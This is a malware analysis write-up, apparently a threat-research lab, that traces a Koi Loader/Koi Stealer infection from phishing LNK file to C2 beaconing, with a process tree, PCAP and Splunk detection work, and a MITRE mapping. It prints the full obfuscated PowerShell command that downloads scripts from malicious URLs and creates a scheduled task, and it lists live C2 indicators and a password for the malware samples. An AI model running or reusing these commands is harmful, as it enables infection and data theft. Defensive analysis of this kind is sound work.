## Oveerview

Date:2025-08-07

Attack : KOI Stealer

Koi Stealer is delivered via a shortcut file and uses PowerShell and scheduled tasks to maintain persistence and deliver further payloads. The attack relies on remote-hosted JS files, renaming tricks, and silent downloaders to bypass defenses and exfiltrate data via standard HTTP requests to a hardcoded C2 IP.

## Download the related files

`2025-07-08-IOCs-from-Koi-Loader-Koi-Stealer-infection.txt.zip`   
`2025-07-08-traffic-from-Koi-Loader-Koi-Stealer-infection.pcap.zip`  
`2025-07-08-malware-from-Koi-Loader-Koi-Stealer-infection.zip`   

use password `infected_20250807`

2025-07-08-IOCs-from-Koi-Loader-Koi-Stealer-infection.txt.zip

- 	Indicators of Compromise

2025-07-08-traffic-from-Koi-Loader-Koi-Stealer-infection.pcap.zip
 - Network capture showing C2 and dropper activity
   
2025-07-08-malware-from-Koi-Loader-Koi-Stealer-infection.zip
 - Malware binaries: Loader + Stealer

## Infection Flow 

<img width="1095" height="569" alt="image" src="https://github.com/user-attachments/assets/43924028-0b31-4f93-bcb4-bf697f6aa4aa" />


**Step 1**: Lure Link
Victim visits a Google Sites page disguised as a document or phone offer.

Clicks on a phishing download link pointing to a ZIP archive.

**Step 2**: ZIP File Execution
Victim downloads and extracts chase_28_06_25.zip.

ZIP contains chase_28_06_25.lnk (malicious Windows shortcut).

**Step 3**: LNK File Triggers PowerShell
.lnk runs the following:

`powershell.exe -comma $... = "...";
curl.exe -o tzldirf5ddw1aq.js <malicious_URL_1>;
curl.exe -o fci6u30bkw0w <malicious_URL_2>;
Move-Item fci6u30bkw0w 8t9fognkq.js;
schtasks /create /sc minute /tr $payload /tn 8t9fognkq;`

This Downloads two malicious JavaScript files and renames them

Creates a Scheduled Task to repeatedly execute the malware

**Step 4**: Payload Delivery
Downloaded JS files trigger:

PowerShell script downloads (.ps1)

Final payload executable: hypochnosedxY.exe

**Step 5**: Stealer Activation
Final EXE executes and:

Steals browser/system/crypto info

Sends data to: 193.29.57.167

## Process Tree

```plaintext
explorer.exe
└───chase_28_06_25.lnk  (user double-click)
     └───powershell.exe (hidden)
          ├───curl.exe -s -L -o tzldirf5ddw1aq.js https://conleyuniversity.us/wp-content/uploads/2016/04/unalphabetedbQFK.php
          ├───curl.exe -s -L -o fci6u30bkw0w https://conleyuniversity.us/wp-content/uploads/2016/04/excommengeoB.php
          ├───rename fci6u30bkw0w → 8t9fognkq.js
          ├───schtasks.exe /create /sc minute /mo 1 /tr [malicious JS] /tn 8t9fognkq
          │    └── Scheduled Task (repeated execution)
          └───[Start of repeated scheduled execution]
               └───wscript.exe tzldirf5ddw1aq.js 8t9fognkq.js
                    └───powershell.exe
                         ├───curl.exe -o abstractingN1.php.ps1
                         ├───curl.exe -o unlivablenessLpW4.ps1
                         ├───powershell.exe -ExecutionPolicy Bypass -File unlivablenessLpW4.ps1
                         ├───curl.exe -o hypochnosedxY.exe
                         └───hypochnosedxY.exe (FINAL PAYLOAD – KOI STEALER)
                              └───Network connections:
                                   ├───193.29.57.167 (C2)
                                   └───Data exfiltration / beaconing
```

## `.lnk` shortcut file Dynamic Analysis

This .lnk (Windows shortcut) file serves as the initial execution vector in the infection chain, designed to download and execute JavaScript payloads that further retrieve and run Koi Loader and eventually Koi Stealer.


<img width="1267" height="238" alt="image" src="https://github.com/user-attachments/assets/bce45da8-bb3b-4f4e-b51c-a2a6868293cf" />


<img width="1218" height="363" alt="image" src="https://github.com/user-attachments/assets/974c761e-df32-466e-a19a-20ca7350d693" />


We can see the command line argument info and the files that it drops


When executed, the .lnk file launches PowerShell with the following constructed command:

```
powershell.exe -comma $iasmaenembxa11k = 'w'+'sc'+'ript C:\ProgramData\' + ('tzldirf5ddw1aq.js 8t9fognkq'); 
& ('curl.exe') -s -L -o tzldirf5ddw1aq.js 'https://conleyuniversity.us/wp-content/uploads/2016/04/unalphabetedbQFK.php'; 
& ('curl.exe') -sL -o fci6u30bkw0w 'https://conleyuniversity.us/wp-content/uploads/2016/04/excommengeoB.php'; 
Move-Item fci6u30bkw0w 8t9fognkq.js; 
. ('schtasks') ('/create') /f /sc minute /mo 1 /tr $iasmaenembxa11k /tn 8t9fognkq;
```

Function

curl.exe ... unalphabetedbQFK.php - 	Downloads obfuscated JS file → tzldirf5ddw1aq.js

curl.exe ... excommengeoB.php	- Downloads another JS payload → saved temporarily

Move-Item	 - Renames second JS file to 8t9fognkq.js

schtasks	 - Sets up persistence to run both JS files every minute using wscript

The .lnk file (chase_28_06_25.lnk) initiates the attack by running a hidden PowerShell command that downloads and executes an obfuscated JavaScript file. This script downloads further JS files—one sets up persistence via a scheduled task, while another fetches and runs the final payload (Koi Stealer). The overall chain starts with the .lnk, which triggers JS loaders, sets persistence, and delivers the stealer.

## tzldirf5ddw1aq.js File

<img width="1367" height="312" alt="image" src="https://github.com/user-attachments/assets/30bc9c57-d84f-4325-8669-289b1d4b8afd" />

| Action                      | Description                                                                                     |
| --------------------------- | ----------------------------------------------------------------------------------------------- |
| **ActiveX Object Creation** | Instantiates `WScript.Shell` for running system-level commands.                                 |
| **Deletes Scheduled Task**  | Uses PowerShell to forcibly delete a scheduled task with the name passed as the first argument. |
| **Re-Executes Payload**     | Immediately runs the corresponding `.js` file from `%ProgramData%` to persist execution.        |
| **Silent Execution**        | Runs in background with no visible window (`Run(..., 0)`).                                      |


Task Cleanup	- Removes traces of old scheduled task (schtasks /delete).
Re-Persistence	- Re-invokes JavaScript payload from %ProgramData%.
Anti-Forensics	 - Reduces static indicators of compromise (IOCs).

## 8t9fognkq.js

<img width="1893" height="645" alt="image" src="https://github.com/user-attachments/assets/8fec3213-f4d2-4a10-9841-f41ad7c72739" />

| Action                           | Description                                                                                               |
| -------------------------------- | --------------------------------------------------------------------------------------------------------- |
| **ActiveX Abuse**             | Uses `WScript.Shell` and `Scripting.FileSystemObject` for system interaction.                             |
| **Self-Replication**          | Copies itself to `%ProgramData%` as `r<MACHINEGUID>r.js` to evade detection and ensure persistence.       |
| **Processor-Aware PS**        | Detects CPU bitness to use correct PowerShell executable (SysWOW64/System32).                             |
| **Downloads Payloads**        | If temp file doesn’t exist, runs PowerShell to **download and execute** two scripts: abstractingN1.php,unlivablenessLpW4.ps1                    |
| **Obfuscated C2 Call**       | PowerShell uses `iwr` (Invoke-WebRequest) and `IEX` (Invoke-Expression) to fetch & run remote content.    |
| **Environmental Fingerprint** | Uses `MachineGuid` as an identifier – possibly for unique victim tracking on the C2 side.                 |


## Purpose of `.php` and `.ps1` files

| File                    | Type                         | Purpose                                                                                                                                                                           |
| ----------------------- | ---------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `abstractingN1.php`     | PHP (used as raw PowerShell) | Contains obfuscated PowerShell commands for setting up or downloading the next stage payloads. Not actually run as PHP — it's treated as a `.ps1` script via `Invoke-Expression`. |
| `unlivablenessLpW4.ps1` | PowerShell script            | **Main loader** that: <br>• Fetches & executes the **final payload** (`hypochnosedxY.exe`, a KOI Stealer) <br>• Establishes persistence <br>• sets up C2 beaconing       |
| `hypochnosedxY.exe`     | EXE                          | Final stage malware – **KOI Stealer** that connects to `193.29.57.167` for data exfiltration and beaconing.                                                                       |

## PCAP Analysis

<img width="1095" height="472" alt="image" src="https://github.com/user-attachments/assets/97809d88-55ba-4172-95e7-f4741945d59b" />

## Initial Observations:
- Legitimate HTTPS connections (port 443) to:
  - `google.com`, `drive.google.com`, `googleusercontent.com`
  - Possibly masquerading as normal traffic (initial beacon check?).
- Malicious domains:
  - `conleyuniversity.us` (used over HTTPS)
  - `193.29.57.167` (direct IP, over HTTP port 80)

---

## Malicious Traffic (C2 Activity):
### Domain: `193.29.57.167`
- **Protocol**: HTTP (plain text)
- **Methods**: `POST` and `GET`
- **Endpoints**:
  - `/topotactic.php` → Classic C2 callback endpoint.
  - `/index.php` → Likely used for additional command delivery or status updates.

### Domain: `conleyuniversity.us`
- **Client Hello** seen over port 443 — implies encrypted channel (likely secondary C2 or download site).
- Possibly used for:
  - Downloading staging scripts or payloads (.ps1, .php, .js)
  - C2 backup

---

## Likely Behavior:
1. **Initial Infection** triggers C2 connection to `193.29.57.167`.
2. Repeated `POST` to `/topotactic.php`:
   - Exfiltration of system info, beacons, or task check-ins.
3. `GET`/`POST` to `/index.php`:
   - Receives commands, next stage payloads, or configuration.
   - Variant types via parameters like `?ver=64&type=1` suggest modular payload fetching.
4. The activity is **consistent and periodic**, indicating a looped beaconing mechanism.

## Splunk Detection

We will convert the pcap into json while adding a filter

<img width="628" height="79" alt="image" src="https://github.com/user-attachments/assets/950090a5-b575-4b11-a06b-9fec39cd3335" />

## Checking for c2 communication

```bash
source="koi1.json" host="localhost" sourcetype="Koi" "193.29.57.167"
| rex field=_raw "(?<src_ip>\d+\.\d+\.\d+\.\d+).+?(?<dest_ip>193\.29\.57\.167)"
| table _time src_ip dest_ip _raw
```
<img width="1917" height="922" alt="image" src="https://github.com/user-attachments/assets/6776fd3e-0c04-4013-8ee1-22d67f4ad8ad" />

Captured traffic indicates beaconing activity and likely C2 (Command & Control) communication from a compromised host to a suspicious domain/IP via HTTP POST.

C2 IP: 193.29.57.167

C2 Endpoint: /topotactic.php

Method: HTTP POST

User-Agent: Impersonating legacy Internet Explorer (Mozilla/5.0 ... Trident/7.0)

Payload Type: application/octet-stream, binary encoded

Indicators of Obfuscation: Decompression failed on content body (likely XOR/encrypted)

### Relevant log entry
```plaintext
{
  "http.request.method": "POST",
  "http.request.uri": "/topotactic.php",
  "http.host": "193.29.57.167",
  "http.user_agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "http.content_type": "application/octet-stream",
  "http.content_encoding": "binary",
  "http.content_length": "40",
  "http.request.full_uri": "http://193.29.57.167/topotactic.php",
  "data.data": "31:30:32:7c:39:31:62:37:32:63:65:34:2d:33:34:34:38:2d:37:61:65:33:2d:64:64:38:38:2d:63:30:33:37:64:37:33:62:38:37:61:66"
}
```

### Decoded payload

Hex: 31 30 32 7c 39 31 62 37 32 63 65 34 2d 33 34 34 38 2d 37 61 65 33 2d 64 64 38 38 2d 63 30 33 37 64 37 33 62 38 37 61 66
ASCII: 102|91b72ce4-3448-7ae3-dd88-c037d73b87af

102 → Possibly a beacon ID or command type

91b72ce4-3448-7ae3-dd88-c037d73b87af → Likely a unique bot or host identifier (UUID)

| Field                          | Value                                                                 |
| ------------------------------ | --------------------------------------------------------------------- |
| `tcp.payload`                  | Contains full POST request and binary data                            |
| `tcp.analysis.push_bytes_sent` | 312 bytes – unusually large for heartbeat, suggests config/data exfil |
| `tcp.flags`                    | `ACK + PSH` set → confirms data transfer intent                       |
| `http.content_encoding`        | `binary` (custom encoding, not standard gzip/deflate)                 |
| `_ws.expert.message`           | `Decompression failed` → indicates non-standard or encrypted payload  |



 ## MITRE ATT&CK Mapping

| Tactic                  | Technique                               | ID            | Description                                                                 |
|------------------------|------------------------------------------|---------------|-----------------------------------------------------------------------------|
| Initial Access         | User Execution: Malicious Shortcut       | T1204.002     | Victim executes a `.lnk` file which starts the infection chain.             |
| Execution              | Command and Scripting Interpreter: PowerShell | T1059.001 | PowerShell used to execute downloaded scripts (`unlivablenessLpW4.ps1`).    |
| Execution              | Scripting via ActiveXObject + WScript    | T1059.005     | JavaScript uses `ActiveXObject` to invoke Windows shell.                   |
| Persistence            | Scheduled Task/Job: Scheduled Task       | T1053.005     | Malware creates or deletes scheduled tasks for persistence/cleanup.        |
| Defense Evasion        | Obfuscated Files or Information          | T1027         | Script and file names like `hypochnosedxY.exe`, `sd2.ps1` are obfuscated.  |
| Command and Control    | Application Layer Protocol: Web Protocols| T1071.001     | Communication with C2 via HTTP(S) over ports 80/443.                        |
| Command and Control    | Ingress Tool Transfer                    | T1105         | Executables (`.exe`, `.php`, `.ps1`) downloaded from external URLs.         |
| Collection             | Input Capture or Data Staging (suspected)| T1056 / T1074 | May involve RAT payload for capturing data or staging for exfil.           |
